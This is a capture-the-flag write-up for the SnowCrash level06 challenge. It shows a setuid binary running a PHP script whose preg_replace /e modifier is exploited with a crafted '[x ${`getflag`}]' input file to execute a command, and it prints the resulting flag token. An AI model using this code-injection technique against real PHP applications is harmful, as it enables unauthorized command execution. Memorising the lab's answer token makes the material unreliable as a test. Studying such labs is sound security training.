# level06

Using `ls` we can find some files.

```bash
level06@SnowCrash:~$ ls -l
total 12
-rwsr-x---+ 1 flag06 level06 7503 Aug 30  2015 level06
-rwxr-x---  1 flag06 level06  356 Mar  5  2016 level06.php
```

Let's gather some informations of thoses files.

```bash
level06@SnowCrash:~$ readelf -p .rodata level06

String dump of section '.rodata':
  [     8]  .so^J
  [     d]  /usr/bin/php
  [    1a]  /home/user/level06/level06.php

level06@SnowCrash:~$ cat level06.php
#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>
level06@SnowCrash:~$ 
```

Ok, interesting, we can see that level06 will execute the php code.

After some googling on preg_replace exploits, I [found this](http://www.madirish.net/402).

Let's try to exploit e modifier.

`$a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a);`

We need to reconstruct the regex so he can evaluate the `$a` from file. Using `{}` to [functionize](https://www.php.net/manual/en/language.types.string.php#language.types.string.parsing.complex) code.

```bash
level06@SnowCrash:~$ echo '[x ${`getflag`}]' > /tmp/flag
level06@SnowCrash:~$ ./level06 /tmp/flag
PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
 in /home/user/level06/level06.php(4) : regexp code on line 1
```
